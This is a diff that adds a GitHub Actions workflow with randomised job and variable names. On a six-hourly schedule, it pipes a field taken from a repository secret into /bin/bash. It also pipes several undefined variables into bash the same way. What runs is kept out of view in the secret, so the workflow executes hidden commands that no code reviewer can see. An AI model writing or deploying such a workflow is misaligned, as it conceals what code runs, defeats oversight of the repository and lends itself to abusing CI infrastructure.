@@ -1,0 +1,24 @@
+name: hantao19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hantao19871010
+        env:
+          mjit3559: ${{ secrets.mjit3559 }}
+        run: |
+          echo $mjit3559 | jq -r .hvld8 | /bin/bash
+          echo $eb74143 | jq -r .n1 | /bin/bash
+          echo $vb568 | jq -r .d33 | /bin/bash
+          echo $vun3887 | jq -r .xi6654 | /bin/bash
+          echo $so51340 | jq -r .dhv58 | /bin/bash
+          echo $tfvey22274 | jq -r .bl6476 | /bin/bash
+          echo $oam2 | jq -r .fglk46 | /bin/bash
+          echo $f402 | jq -r .cgm9 | /bin/bash
+          echo $kou01 | jq -r .wqblj0635 | /bin/bash
+
